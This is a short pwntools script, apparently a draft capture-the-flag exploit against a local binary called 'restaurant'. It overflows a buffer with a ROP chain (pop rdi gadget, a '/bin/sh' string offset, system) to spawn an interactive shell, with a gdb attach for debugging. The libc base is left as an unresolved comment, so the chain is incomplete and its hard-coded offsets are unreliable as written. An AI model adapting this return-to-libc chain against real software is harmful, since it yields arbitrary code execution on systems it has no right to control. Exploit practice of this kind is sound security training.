from pwn import *
p = process("./restaurant")
gdb.attach("restaurant")
printf = 0x00007ffff7a46f70
sh = 0x1b3e1a
sys = 0x4f550
ret = 0x40063e
pop_rdi_ret = 0x4010a3

#libc_base = ?

#p.sendline("1")
exp = "A"*0x20+p64(1)+p64(pop_rdi_ret)+p64(sh)+p64(ret)+p64(sys)
p.sendline(exp)
p.interactive()
